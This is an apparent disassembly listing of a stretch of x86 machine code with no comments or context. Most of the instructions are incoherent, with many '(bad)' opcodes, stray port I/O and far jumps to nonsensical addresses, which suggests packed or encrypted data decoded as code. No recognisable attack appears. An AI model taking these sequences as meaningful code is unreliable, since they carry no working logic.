  415935:	add    dl,BYTE PTR cs:[eax+0x32ec0450]
  41593c:	cmp    bl,BYTE PTR [ebx]
  41593e:	pop    es
  41593f:	inc    ebp
  415940:	and    eax,0xb7633c2b
  415945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415946:	add    ecx,DWORD PTR [ebp+0x3559825b]
  41594c:	xchg   esi,eax
  41594d:	sbb    al,0xb
  41594f:	dec    eax
  415950:	push   edx
  415951:	jno    0x4158e9
  415953:	(bad)  
  415954:	cmp    eax,0x241db4e4
  415959:	jne    0x415934
  41595b:	inc    eax
  41595c:	xchg   ecx,eax
  41595d:	and    al,0xa
  41595f:	sub    al,0x8e
  415961:	or     BYTE PTR [ecx+0x20],0x4
  415965:	jb     0x4159e0
  415967:	fs mov dl,0xe2
  41596a:	fadd   DWORD PTR ds:0xf0647a5c
  415970:	test   al,0xf0
  415972:	js     0x4158fb
  415974:	pop    eax
  415975:	adc    ecx,DWORD PTR [ecx+eax*8-0x29ed8011]
  41597c:	pusha  
  41597d:	fisttp DWORD PTR [eax-0x5b]
  415980:	xor    al,0xe3
  415982:	fist   WORD PTR [ecx-0x3fa464a6]
  415988:	mov    eax,0x365fe0a6
  41598d:	je     0x4159c0
  41598f:	pusha  
  415990:	(bad)  
  415991:	push   0x2eca4717
  415996:	scas   al,BYTE PTR es:[edi]
  415997:	and    DWORD PTR [eax-0xee98f58],ecx
  41599d:	stc    
  41599e:	and    ecx,DWORD PTR ds:0x66cdf880
  4159a4:	cld    
  4159a5:	in     al,dx
  4159a6:	outs   dx,DWORD PTR ds:[esi]
  4159a7:	mov    eax,0x1d151dfc
  4159ac:	in     al,0xf3
  4159ae:	mov    edi,0xe967a1fd
  4159b3:	out    dx,eax
  4159b4:	test   dl,bl
  4159b6:	pop    es
  4159b7:	retf   
  4159b8:	mov    dh,0x2a
  4159ba:	scas   eax,DWORD PTR es:[edi]
  4159bb:	aas    
  4159bc:	xor    BYTE PTR [edi-0x39],cl
  4159bf:	lea    eax,[ebx]
  4159c1:	or     al,0xa0
  4159c3:	cmp    al,0x97
  4159c5:	into   
  4159c6:	fistp  WORD PTR [edi-0x5f7fc98e]
  4159cc:	xlat   BYTE PTR ds:[ebx]
  4159cd:	xchg   edi,eax
  4159ce:	add    al,0x46
  4159d0:	xlat   BYTE PTR ds:[ebx]
  4159d1:	xchg   DWORD PTR [ecx+0x3ec1049e],esi
  4159d7:	mov    eax,ds:0x9999a03c
  4159dc:	xchg   ebx,esp
  4159de:	mov    ebx,0x557b6e17
  4159e3:	ror    DWORD PTR [ebx+0x25bd3953],1
  4159e9:	into   
  4159ea:	ds jb  0x4159ca
  4159ed:	outs   dx,BYTE PTR ds:[esi]
  4159ee:	mov    eax,0xb458716a
  4159f3:	aad    0x4e
  4159f5:	fisttp DWORD PTR [eax]
  4159f7:	repz jno 0x415a6a
  4159fa:	in     eax,dx
  4159fb:	sbb    BYTE PTR [ecx],bl
  4159fd:	nop
  4159fe:	mov    BYTE PTR [esp+edi*2],dl
  415a01:	xchg   ebx,eax
  415a02:	fnstsw WORD PTR [edx]
  415a04:	fsubr  QWORD PTR [esi-0x1454e8ab]
  415a0a:	sub    ecx,0x2ac01884
  415a10:	lahf   
  415a11:	aad    0x1a
  415a13:	mov    dl,al
  415a15:	std    
  415a16:	adc    ebp,DWORD PTR [eax+0x56]
  415a19:	fistp  QWORD PTR [edx]
  415a1b:	fbld   TBYTE PTR [ebx+edx*1-0x27]
  415a1f:	inc    ebx
  415a20:	xlat   BYTE PTR ds:[ebx]
  415a21:	pop    edi
  415a22:	or     al,0x17
  415a24:	push   esi
  415a25:	add    BYTE PTR [ebp+0x6e4838f9],0xe1
  415a2c:	fld    TBYTE PTR [ecx-0x10]
  415a2f:	retf   0x5e2c
  415a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a33:	push   ebp
  415a34:	es cdq 
  415a36:	dec    esp
  415a37:	push   ss
  415a38:	mov    esi,0x5b7fde69
  415a3d:	test   eax,0x1a6d7d3d
  415a42:	into   
  415a43:	push   esi
  415a44:	jecxz  0x415abb
  415a46:	lahf   
  415a47:	add    bl,BYTE PTR [esi-0x77]
  415a4a:	xor    ch,BYTE PTR [ebx-0x2c]
  415a4d:	mov    bh,0x46
  415a4f:	cmc    
  415a50:	push   edi
  415a51:	aaa    
  415a52:	jmp    0xcbedaaa8
  415a57:	xor    al,0xf7
  415a59:	sar    DWORD PTR [edx+0x4b],0x97
  415a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a5e:	add    DWORD PTR [esi+0x5f19261f],ecx
  415a64:	jmp    0xce8c7ab1
  415a69:	xor    al,0x49
  415a6b:	addr16 (bad) 
  415a6d:	popf   
  415a6e:	jmp    0x415a2d
  415a70:	sbb    ah,BYTE PTR [ecx-0x12]
  415a73:	pop    ecx
  415a74:	fild   WORD PTR [edi]
  415a76:	sub    DWORD PTR ds:[edi-0x6eed44b1],esp
  415a7d:	repz fprem1 
  415a80:	clc    
  415a81:	xchg   esp,eax
  415a82:	fidiv  DWORD PTR [edi+0x566cda1f]
  415a88:	iret   
  415a89:	mov    ds:0x5e17dc24,al
  415a8e:	xor    dh,BYTE PTR [edx-0x67327cf3]
  415a94:	stos   DWORD PTR es:[edi],eax
  415a95:	mov    ch,0x5
  415a97:	mov    bh,0xfa
  415a99:	adc    cl,BYTE PTR ds:0x3fd6e69b
  415a9f:	bound  eax,QWORD PTR [edx-0x1]
  415aa2:	pop    ecx
  415aa3:	in     al,dx
  415aa4:	pop    ecx
  415aa5:	call   0xd4477e87
  415aaa:	add    BYTE PTR [ecx],ch
  415aac:	fstp   QWORD PTR [eax+eiz*2-0x2ec556a5]
  415ab3:	out    0x40,al
  415ab5:	or     DWORD PTR [edi],eax
  415ab7:	popf   
  415ab8:	xchg   BYTE PTR ds:[ebp+0x15047940],bh
  415abf:	cli    
  415ac0:	div    BYTE PTR [ebp+0x45]
  415ac3:	sbb    al,BYTE PTR [ecx+0x6b]
  415ac6:	stc    
  415ac7:	jno    0x415a4c
  415ac9:	rcr    DWORD PTR [esi-0xa8d308b],cl
  415acf:	int    0x1b
  415ad1:	cwde   
  415ad2:	mov    esi,0xfa3a7f92
  415ad7:	mov    eax,ds:0xbae21ba0
  415adc:	inc    ebp
  415add:	cmp    BYTE PTR [eax+0x7aec6ea7],al
  415ae3:	test   eax,0xd3f75eaa
  415ae8:	cwde   
  415ae9:	push   ebp
  415aea:	out    dx,al
  415aeb:	mov    WORD PTR [esi-0x16],ss
  415aee:	xor    eax,DWORD PTR [esp+ebx*8-0x6859ac92]
  415af5:	xchg   esi,eax
  415af6:	xor    DWORD PTR [esi],ebp
  415af8:	bound  ebx,QWORD PTR [edi+0x5e]
  415afb:	cmp    ecx,0xbc137a8d
  415b01:	not    DWORD PTR [edx]
  415b03:	sbb    BYTE PTR [edx+0x41],ah
  415b06:	sub    DWORD PTR [edi],esi
  415b08:	ja     0x415b28
  415b0a:	sub    BYTE PTR [edi],0xa6
  415b0d:	scas   al,BYTE PTR es:[edi]
  415b0e:	mov    ebx,0x81d2388b
  415b13:	pop    ss
  415b14:	adc    BYTE PTR [edi],bh
  415b16:	out    dx,eax
  415b17:	jg     0x415b7f
  415b19:	jge    0x415af7
  415b1b:	xchg   esi,eax
  415b1c:	sbb    edi,DWORD PTR [edx]
  415b1e:	push   es
  415b1f:	adc    eax,0xeced4a11
  415b24:	rol    esp,cl
  415b26:	arpl   WORD PTR [ecx],dx
  415b28:	je     0x415b1d
  415b2a:	sub    edi,ebx
  415b2c:	mov    esp,0xd4dbcd5e
  415b31:	and    esi,ebx
  415b33:	mov    bl,0x7b
  415b35:	rcl    DWORD PTR [ebx],cl
  415b37:	adc    eax,0xc500c98e
  415b3c:	xchg   esi,eax
  415b3d:	out    0xa0,eax
  415b3f:	inc    esp
  415b40:	loope  0x415b97
  415b42:	outs   dx,DWORD PTR ds:[esi]
  415b43:	div    bh
  415b45:	mov    ebp,0x7d3be117
  415b4a:	shr    BYTE PTR [edi],cl
  415b4c:	push   edi
  415b4d:	or     bh,BYTE PTR ds:0xc2ade1d3
  415b53:	out    0x9c,eax
  415b55:	fnstenv [ebp+0x1c8b5eb7]
  415b5b:	hlt    
  415b5c:	fdivrp st(6),st
  415b5e:	aad    0xbc
  415b60:	push   ss
  415b61:	or     DWORD PTR [ebx],esp
  415b63:	das    
  415b64:	outs   dx,DWORD PTR ds:[esi]
  415b65:	mov    edi,gs
  415b67:	or     eax,0xd9af9181
  415b6c:	ds js  0x415b15
  415b6f:	enter  0x2b3,0xf7
  415b73:	and    dl,BYTE PTR [esi]
  415b75:	add    BYTE PTR [eax],cl
  415b77:	jmp    0x6ffdc44
  415b7c:	call   0x595a:0x6c686ad8
  415b83:	dec    eax
  415b84:	out    0xed,eax
  415b86:	push   ds
  415b87:	mov    eax,ds:0xf17091c3
  415b8c:	test   ebx,ebp
  415b8e:	fsub   DWORD PTR [edi-0xb687011]
  415b95:	imul   ebx,DWORD PTR [eax-0x2925dd26],0xf575573c
  415b9f:	mov    eax,ds:0xaccab368
  415ba4:	and    eax,0xc2e190be
  415ba9:	pop    DWORD PTR [eax-0x1212b4ff]
  415baf:	arpl   WORD PTR [ecx+edi*2],bx
  415bb2:	out    dx,al
  415bb3:	(bad)  
  415bb4:	test   DWORD PTR [ebp-0x4a55ce52],ecx
  415bba:	mov    WORD PTR [ebp+0xf801feb],es
  415bc0:	js     0x415c38
  415bc2:	and    DWORD PTR [edi-0x35],esi
  415bc5:	popa   
  415bc6:	pop    ebx
  415bc7:	mov    eax,ds:0x8323d70c
  415bcc:	sbb    eax,0x599702da
  415bd1:	mov    ebx,0x979ab28e
  415bd6:	jmp    0x415b64
  415bd8:	or     dh,BYTE PTR [eax-0x70a47094]
  415bde:	xor    edi,DWORD PTR [ebx]
  415be0:	push   0x14
  415be2:	mov    ebx,DWORD PTR [eax-0x62810c8d]
  415be8:	jp     0x415c10
  415bea:	cmc    
  415beb:	js     0x415ba6
  415bed:	hlt    
  415bee:	call   0x4712:0x9e1c7fc4
  415bf5:	add    dl,BYTE PTR [ebp-0x31]
  415bf8:	imul   eax,DWORD PTR [edx],0x468d4a8c
  415bfe:	std    
  415bff:	adc    eax,0xa30d47a4
  415c04:	test   DWORD PTR [edi],esi
  415c06:	inc    esi
  415c07:	inc    ebx
  415c08:	xlat   BYTE PTR ds:[ebx]
  415c09:	push   esp
  415c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0b:	xor    BYTE PTR [edi-0x5d1613f],ch
  415c11:	js     0x415bc1
  415c13:	in     al,dx
  415c14:	xor    al,0xaa
  415c16:	loop   0x415c71
  415c18:	push   esp
  415c19:	lods   al,BYTE PTR ds:[esi]
  415c1a:	int3   
  415c1b:	cmp    BYTE PTR [edi+0x5e166558],bh
  415c21:	or     ecx,0x46
  415c24:	jnp    0x415bea
  415c26:	hlt    
  415c27:	std    
  415c28:	push   0xd
  415c2a:	push   ecx
  415c2b:	das    
  415c2c:	fnstsw WORD PTR [edx+0x13]
  415c2f:	pop    ss
  415c30:	cmc    
  415c31:	ficom  DWORD PTR [esi]
  415c33:	xchg   ebp,eax
  415c34:	leave  
  415c35:	fmul   DWORD PTR [eax]
  415c37:	mov    ebx,0x1555543a
  415c3c:	cmp    dl,BYTE PTR [edx+0x1d]
  415c3f:	sar    DWORD PTR [ecx],cl
  415c41:	jo     0x415c16
  415c43:	cmp    ah,BYTE PTR [edx]
  415c45:	push   esp
  415c46:	popf   
  415c47:	pop    ds
  415c48:	adc    BYTE PTR [esi],al
  415c4a:	ss jge 0x415c77
  415c4d:	fs scas al,BYTE PTR es:[edi]
  415c4f:	and    eax,0x569338ab
  415c54:	call   0x6c9a:0x644a792c
  415c5b:	dec    ebx
  415c5c:	cmp    eax,0xb97d3278
  415c61:	shufps xmm2,xmm3,0x9
  415c65:	mov    edi,0x242ad5a6
  415c6a:	dec    esp
  415c6b:	xchg   al,cl
  415c6d:	sbb    DWORD PTR [ebx],ebp
  415c6f:	in     eax,dx
  415c70:	adc    DWORD PTR [edi],esp
  415c72:	jno    0x415ced
  415c74:	sar    BYTE PTR [ecx+0xa],0xcd
  415c78:	sbb    esi,DWORD PTR [esi-0x11]
  415c7b:	mov    WORD PTR [edi+eax*1+0x3489608c],?
  415c82:	xchg   esi,eax
  415c83:	sub    dl,al
  415c85:	(bad)  
  415c86:	and    bh,cl
  415c88:	aam    0x88
  415c8a:	sar    BYTE PTR [ebx],cl
  415c8c:	pop    esp
  415c8d:	xor    eax,0x99960cf4
  415c92:	out    0x9c,al
  415c94:	pop    ecx
  415c95:	repnz xchg ecx,eax
  415c97:	test   BYTE PTR [eax-0x13d96869],cl
  415c9d:	mov    esp,0x161b87f1
  415ca2:	fst    DWORD PTR [ecx]
  415ca4:	out    dx,eax
  415ca5:	pushf  
  415ca6:	pop    esi
  415ca7:	lock inc edi
  415ca9:	fidiv  DWORD PTR [ebx-0x72]
  415cac:	nop
  415cad:	and    eax,0x6efa3fdf
  415cb2:	stos   DWORD PTR es:[edi],eax
  415cb3:	or     eax,0x1f6fd4ae
  415cb8:	sub    dh,dh
  415cba:	test   eax,0xcc65ca4b
  415cbf:	(bad)  
  415cc1:	pushw  ds
  415cc3:	sbb    ecx,DWORD PTR [esi-0x50a995c4]
  415cc9:	outs   dx,BYTE PTR ds:[esi]
  415cca:	sbb    ecx,edi
  415ccc:	cmp    al,cl
  415cce:	push   ss
  415ccf:	xor    eax,0xd48bf7ab
  415cd4:	sahf   
  415cd5:	pop    esi
  415cd6:	mov    bh,0x98
  415cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cd9:	fcmove st,st(6)
  415cdb:	cmp    eax,DWORD PTR [esi]
  415cdd:	std    
  415cde:	dec    esi
  415cdf:	out    0xc7,al
  415ce1:	and    BYTE PTR [eax-0x7c],bl
  415ce4:	(bad)
  415ce7:	mov    edx,0xdb1cd65b
  415cec:	cmp    BYTE PTR [ecx],ah
  415cee:	xor    DWORD PTR [edx-0x2],esp
  415cf1:	outs   dx,DWORD PTR ds:[esi]
  415cf2:	inc    ecx
  415cf3:	cdq    
  415cf4:	fcom   DWORD PTR [edx-0x3c]
  415cf7:	clc    
  415cf8:	sbb    bl,BYTE PTR [esi+edi*2]
  415cfb:	outs   dx,BYTE PTR ds:[esi]
  415cfc:	(bad)  
  415cfe:	mov    al,0x51
  415d00:	pop    ebp
  415d01:	mov    esi,0x3287e72a
  415d06:	dec    ebp
  415d07:	retf   
  415d08:	data16 icebp 
  415d0a:	pop    ebx
  415d0b:	rcr    DWORD PTR [ebp-0x51],cl
  415d0e:	jae    0x415d89
  415d10:	(bad)
  415d13:	adc    ebx,ebx
  415d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d16:	sti    
  415d17:	xchg   edx,eax
  415d18:	fld    TBYTE PTR [ebx+0x75b6f1c0]
  415d1e:	cwde   
  415d1f:	mov    al,ds:0xe8aa940
  415d24:	adc    BYTE PTR [ebx+eax*4+0x4f],ah
  415d28:	push   ebp
  415d29:	inc    edi
  415d2a:	loope  0x415d28
  415d2c:	adc    al,0xa7
  415d2e:	and    al,0x5b
  415d30:	jmp    0xa497:0x6d3d31f
  415d37:	sub    dl,ah
  415d39:	mov    dl,0x4a
  415d3b:	jbe    0x415d88
  415d3d:	fcmove st,st(7)
  415d3f:	(bad)  
  415d40:	jmp    0xad02:0xeef66a59
  415d47:	imul   edx,DWORD PTR [ebp+0x5111e9c7],0x18
  415d4e:	add    al,0xfb
  415d50:	mov    BYTE PTR [eax],al
  415d52:	int    0x85
  415d54:	lods   eax,DWORD PTR ds:[esi]
  415d55:	pop    edx
  415d56:	adc    BYTE PTR [eax-0x42],0x3
  415d5a:	sbb    edi,esi
  415d5c:	pop    edx
  415d5d:	ins    BYTE PTR es:[edi],dx
  415d5e:	ret    0xda78
  415d61:	sbb    BYTE PTR [edx+0x57],ch
  415d64:	add    BYTE PTR [eax],ah
  415d66:	into   
  415d67:	adc    ebx,DWORD PTR [edx*8-0xceced28]
  415d6e:	cld    
  415d6f:	arpl   WORD PTR [esi-0x34391b5b],bx
  415d75:	inc    esi
  415d76:	cmc    
  415d77:	cld    
  415d78:	(bad)  
  415d79:	popf   
  415d7a:	jb     0x415d6f
  415d7c:	jno    0x415d25
  415d7e:	jle    0x415d58
  415d80:	cs lock sti 
  415d83:	outs   dx,BYTE PTR ds:[esi]
  415d84:	cmp    al,0xf5
  415d86:	or     cl,BYTE PTR [edx-0x66]
  415d89:	sti    
  415d8a:	(bad)  
  415d8b:	out    0xcf,eax
  415d8d:	in     al,0x82
  415d8f:	loopne 0x415da6
  415d91:	sar    eax,0xe0
  415d94:	xchg   BYTE PTR [ecx],ah
  415d96:	xor    BYTE PTR [edi+ecx*8],bh
  415d99:	std    
  415d9a:	rcl    DWORD PTR [ecx],0x24
  415d9d:	jnp    0x415df3
  415d9f:	pop    ebp
  415da0:	imul   eax
  415da2:	ficomp DWORD PTR [edi]
  415da4:	pop    esp
  415da5:	inc    eax
  415da6:	inc    esp
  415da7:	xor    DWORD PTR [edi+0x63],0x11b5f995
  415dae:	sti    
  415daf:	xchg   BYTE PTR [esi+esi*2],dh
  415db2:	sar    DWORD PTR [edx],0x65
  415db5:	jns    0x415d7e
  415db7:	add    al,0x60
  415db9:	and    BYTE PTR [eax-0x74],bl
  415dbc:	mov    eax,ds:0x654f936b
  415dc1:	cmp    BYTE PTR [ecx+0x22],0xa0
  415dc5:	xor    ebx,DWORD PTR [ebx-0x7a]
  415dc8:	mov    al,0x5d
  415dca:	sbb    al,0x32
  415dcc:	inc    DWORD PTR [ebx+0x1a]
  415dcf:	imul   ebx,DWORD PTR [ecx+0x4c],0x3416cba5
  415dd6:	aas    
  415dd7:	add    eax,0x4e672a4e
  415ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ddd:	or     DWORD PTR [esi-0x78],ecx
  415de0:	out    dx,eax
  415de1:	scas   eax,DWORD PTR es:[edi]
  415de2:	jb     0x415e0d
  415de4:	jnp    0x415e31
  415de6:	in     al,dx
  415de7:	lods   eax,DWORD PTR ds:[esi]
  415de8:	test   BYTE PTR [ebx-0x5107757e],bh
  415dee:	mov    al,ds:0xcd7b2a80
  415df3:	push   ds
  415df4:	dec    esi
  415df5:	imul   esp,DWORD PTR [eax],0xffffffae
  415df8:	fcom   QWORD PTR cs:[edi]
  415dfc:	xchg   ecx,eax
  415dfd:	push   0x43d0d617
  415e02:	inc    edx
  415e03:	jmp    0x8701b045
  415e08:	sar    BYTE PTR [eax+edi*2-0x36ec321a],1
  415e0f:	xor    ecx,DWORD PTR [edi+esi*4-0x7f05081]
  415e16:	pop    eax
  415e17:	imul   ebx,DWORD PTR [esi+0x7a],0xd9774c78
  415e1e:	int    0xa4
  415e20:	jns    0x415db3
  415e22:	(bad)  
  415e23:	rol    BYTE PTR [ebx-0x73f4015d],1
  415e29:	pop    ss
  415e2a:	push   ds
  415e2b:	sub    al,0x6d
  415e2d:	(bad)  
  415e2e:	fs (bad) 
  415e30:	cmp    DWORD PTR [esp+edi*2+0x52],eax
  415e34:	xchg   edx,eax
  415e35:	jle    0x415e9b
  415e37:	in     al,dx
  415e38:	add    al,0xc7
  415e3a:	mov    ch,0xcc
  415e3c:	pop    ds
  415e3d:	hlt    
  415e3e:	jmp    0x80d2:0xb402e86d
  415e45:	scas   eax,DWORD PTR es:[edi]
  415e46:	cdq    
  415e47:	jmp    0xa15f77db
  415e4c:	push   cs
  415e4d:	addr16 pushf 
  415e4f:	and    DWORD PTR [edx],ebp
  415e51:	lock stos DWORD PTR es:[edi],eax
  415e53:	jbe    0x415e95
  415e55:	xchg   DWORD PTR [edx+0x0],esp
  415e58:	dec    ebx
  415e59:	mov    edi,DWORD PTR ds:0x85caa35a
  415e5f:	mov    dh,0xa4
  415e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e62:	(bad)  
  415e63:	fstp   DWORD PTR [edi-0x18]
  415e66:	and    BYTE PTR [ecx-0x5b0dc29],dh
  415e6c:	fs mov cl,0x8a
  415e6f:	fwait
  415e70:	stc    
  415e71:	jle    0x415e9a
  415e73:	fistp  WORD PTR [ebx-0x15]
  415e76:	es cmp eax,0x5a3e0bb6
  415e7c:	scas   al,BYTE PTR es:[edi]
  415e7d:	(bad)  
  415e7e:	and    eax,0x32d476c8
  415e83:	jno    0x415e53
  415e85:	dec    edi
  415e86:	xor    BYTE PTR [eax-0x5e],bh
  415e89:	sub    al,0xec
  415e8b:	or     ebx,DWORD PTR [ebp-0x6dd9e060]
  415e91:	add    dh,BYTE PTR [edx]
  415e93:	bound  esp,QWORD PTR [edi]
  415e95:	aas    
  415e96:	aad    0xb1
  415e98:	sbb    al,0xb7
  415e9a:	push   ss
  415e9b:	mov    ds:0x2739cf14,al
  415ea0:	test   DWORD PTR ds:0xcd906027,ecx
  415ea6:	pop    esi
  415ea7:	xchg   edi,eax
  415ea8:	out    dx,al
  415ea9:	adc    esp,ebx
  415eab:	adc    eax,0xe5ff2dae
  415eb0:	cmp    eax,0xad27eb9
  415eb5:	inc    edx
  415eb6:	imul   ebx,DWORD PTR [edx],0xffffffbe
  415eb9:	inc    edx
  415eba:	or     eax,0xf1f673a6
  415ebf:	or     al,0xa1
  415ec1:	xor    al,0x28
  415ec3:	dec    ecx
  415ec4:	or     BYTE PTR [edx+0x77],ah
  415ec7:	sbb    esp,edx
  415ec9:	mov    WORD PTR [eax+ecx*4],ds
  415ecc:	test   DWORD PTR [edi],eax
  415ece:	mov    ebx,0x2a291213
  415ed3:	pop    edi
  415ed4:	pop    ss
  415ed5:	cmp    edi,esp
  415ed7:	push   edi
  415ed8:	mov    eax,ds:0x7a09a906
  415edd:	lea    edx,[ebp-0x7b]
  415ee0:	add    DWORD PTR [esi+0x75906954],ebp
  415ee6:	retf   0x942e
  415ee9:	push   eax
  415eea:	loop   0x415f21
  415eec:	int    0x9f
  415eee:	push   edx
  415eef:	xchg   edi,eax
  415ef0:	adc    dl,BYTE PTR [edx-0x3030da1b]
  415ef6:	ss jmp 0x415f52
  415ef9:	push   ds
  415efa:	dec    edx
  415efb:	mov    esp,esi
  415efd:	cmp    ch,BYTE PTR [ecx]
  415eff:	ins    DWORD PTR es:[edi],dx
  415f00:	pusha  
  415f01:	push   0x153d2f4
  415f06:	xor    DWORD PTR [eax+ebx*1],esp
  415f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f0a:	or     BYTE PTR [eax-0x7e34d6ca],dh
  415f10:	mov    ds:0xfe3383d,eax
  415f15:	or     ah,BYTE PTR [ebp-0x16]
  415f18:	int    0x78
  415f1a:	ins    DWORD PTR es:[edi],dx
  415f1b:	xchg   esp,ecx
  415f1d:	mov    al,ds:0xec522dbd
  415f22:	retf   0x2f1f
  415f25:	adc    al,0xa5
  415f27:	mov    edi,0x233eb157
  415f2c:	or     eax,0x3f45341c
  415f31:	fisub  DWORD PTR [ecx-0x34]
  415f34:	sbb    BYTE PTR [edi-0x45],ah
  415f37:	fist   WORD PTR [esi]
  415f39:	sar    dh,cl
  415f3b:	push   ebx
  415f3c:	or     bl,BYTE PTR [edi]
  415f3e:	sbb    al,0x42
  415f40:	sub    ecx,esi
  415f42:	mov    bl,0x90
  415f44:	popa   
  415f45:	out    dx,eax
  415f46:	outs   dx,DWORD PTR ds:[esi]
  415f47:	test   eax,0xad56dad9
  415f4c:	dec    ebx
  415f4d:	loop   0x415eeb
  415f4f:	xlat   BYTE PTR cs:[ebx]
  415f51:	fcomp  QWORD PTR [edx+0x6]
  415f54:	retf   
  415f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f56:	ret    
  415f57:	bound  esi,QWORD PTR [edi]
  415f59:	mov    ecx,0x878f1fed
  415f5e:	cmp    ecx,ebp
  415f60:	push   ss
  415f61:	fxch   st(0)
  415f63:	verw   WORD PTR [edx+0x16d3ca02]
  415f6a:	ret    0x640e
  415f6d:	retf   
  415f6e:	jo     0x415f11
  415f70:	mov    dh,0xfe
  415f72:	xchg   ebp,eax
  415f73:	push   edx
  415f74:	jecxz  0x415fe8
  415f76:	and    dh,cl
  415f78:	xchg   BYTE PTR [ecx+0x1a382d41],dl
  415f7e:	fdiv   QWORD PTR [ecx-0x61]
  415f81:	imul   ebp,DWORD PTR [edi],0x34782b72
  415f87:	sbb    BYTE PTR [ecx-0x59],cl
  415f8a:	je     0x415fe7
  415f8c:	cs sbb al,0x3c
  415f8f:	(bad)  
  415f90:	sub    edx,ebx
  415f92:	gs push cs
  415f94:	xor    BYTE PTR [ebp+0x35],0xa2
  415f98:	fstp   DWORD PTR [edx-0x14ac79ff]
  415f9e:	fild   WORD PTR [edx-0x22]
  415fa1:	out    dx,eax
  415fa2:	sub    BYTE PTR [esp+ebx*1-0xe9cdff3],al
  415fa9:	mov    bl,0x38
  415fab:	addr16 aam 0xfb
  415fae:	int3   
  415faf:	jae    0x415f65
  415fb1:	aam    0x1f
  415fb3:	xor    al,0x69
  415fb5:	mov    esi,0x745c3307
  415fba:	dec    ebp
  415fbb:	(bad)  
  415fbc:	mov    ebp,0x20770f4
  415fc1:	arpl   WORD PTR ds:0x3778ccb4,si
  415fc7:	js     0x415f62
  415fc9:	mov    ebp,0x2fab3edb
  415fce:	popa   
  415fcf:	out    0x69,al
  415fd1:	sub    ch,0xe2
  415fd4:	xlat   BYTE PTR ds:[ebx]
  415fd5:	mov    al,0xe6
  415fd7:	dec    ebp
  415fd8:	fs stos BYTE PTR es:[edi],al
  415fda:	jno    0x415fdc
  415fdc:	add    eax,0x4eebc8fa
  415fe1:	das    
  415fe2:	pusha  
  415fe3:	mov    esi,0x395ed74e
  415fe8:	(bad)  
  415fe9:	(bad)  
  415fea:	sar    DWORD PTR [edi+ebp*2],0xdc
  415fee:	test   eax,0xc729651f
  415ff3:	in     eax,0x56
  415ff5:	enter  0x907e,0xe
  415ff9:	and    eax,0x4a1401ca
  415ffe:	inc    ebx
  415fff:	sub    bl,BYTE PTR [eax+0x71]
  416002:	repnz cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416005:	push   es
  416006:	mov    esi,edi
  416008:	add    DWORD PTR [esi-0x5af412b8],0xfffffffe
  41600f:	push   es
  416010:	outs   dx,DWORD PTR ds:[esi]
  416011:	push   0xffffff99
  416013:	mov    esp,esp
  416015:	icebp  
  416016:	and    BYTE PTR [esi+0x646a82f5],cl
  41601c:	mov    cl,0x6d
  41601e:	cmp    al,0x3
  416020:	ret    
  416021:	and    cl,bh
  416023:	mov    ecx,esi
  416025:	xchg   ecx,eax
  416026:	sbb    bl,BYTE PTR [edi]
  416028:	mov    DWORD PTR [edx],esi
  41602a:	mov    edx,0xc9095892
  41602f:	not    DWORD PTR [ebx]
  416031:	pusha  
  416032:	jne    0x415fe8
  416034:	aam    0xa3
  416036:	dec    ebp
  416037:	mov    ecx,0xbfb9334
  41603c:	ins    DWORD PTR es:[edi],dx
  41603d:	cmp    al,0x45
  41603f:	mov    esi,0xffe32e42
  416044:	push   esi
  416045:	sub    eax,0xb4875afe
  41604a:	leave  
  41604b:	outs   dx,DWORD PTR ds:[esi]
  41604c:	xor    DWORD PTR [ebp+0x60],0x8adbeb39
  416053:	inc    ecx
  416054:	call   0x6debc745
  416059:	scas   eax,DWORD PTR es:[edi]
  41605a:	inc    edi
  41605b:	loop   0x416042
  41605d:	mov    esp,DWORD PTR [esi-0x2e188d82]
  416063:	jmp    0x41609f
  416065:	lea    eax,[edx+edi*1]
  416068:	inc    ecx
  416069:	(bad)  [ebp+0x78]
  41606c:	pop    ebp
  41606d:	sub    BYTE PTR [esi-0x69],ch
  416070:	fstp   DWORD PTR [edi+0x5972fb5d]
  416076:	outs   dx,DWORD PTR ds:[esi]
  416077:	outs   dx,BYTE PTR ds:[esi]
  416078:	cdq    
  416079:	mov    dl,0xbf
  41607b:	(bad)  
  41607c:	hlt    
  41607d:	stos   BYTE PTR es:[edi],al
  41607e:	xchg   ebx,eax
  41607f:	outs   dx,BYTE PTR ds:[esi]
  416080:	sub    bh,BYTE PTR [edx]
  416082:	les    esi,FWORD PTR [ecx+0x6bc42cac]
  416088:	mov    dh,0x65
  41608a:	inc    edi
  41608b:	sub    esi,esi
  41608d:	out    dx,al
  41608e:	cli    
  41608f:	push   0xffffffd4
  416091:	cdq    
  416092:	mov    dh,0xa
  416094:	mov    esi,0xe7490e06
  416099:	call   0x3bb9:0xc435dd26
  4160a0:	test   BYTE PTR [edx+ebx*4],ah
  4160a3:	dec    edx
  4160a4:	pop    ds
  4160a5:	ret    
  4160a6:	pop    edi
  4160a7:	add    ah,BYTE PTR [ecx-0x7a33253c]
  4160ad:	inc    ecx
  4160ae:	pop    es
  4160af:	cmp    eax,0x504fb254
  4160b4:	xchg   esp,eax
  4160b5:	ret    
  4160b6:	aad    0xcb
  4160b8:	pop    ecx
  4160b9:	icebp  
  4160ba:	cmp    al,al
  4160bc:	cmp    dl,BYTE PTR [edx]
  4160be:	fdivr  DWORD PTR [ecx*4+0x7b9cbedc]
  4160c5:	gs xor ch,cl
  4160c8:	push   ds
  4160c9:	push   cs
  4160ca:	mov    ah,0x95
  4160cc:	sub    eax,0xc37d0b9b
  4160d1:	sub    dh,BYTE PTR [ecx-0x62]
  4160d4:	push   cs
  4160d5:	inc    edx
  4160d6:	push   es
  4160d7:	pop    ss
  4160d8:	xchg   esi,eax
  4160d9:	jmp    0x416111
  4160db:	dec    edx
  4160dc:	mov    bh,0x0
  4160de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160df:	push   0xe024adeb
  4160e4:	call   0x45184a4c
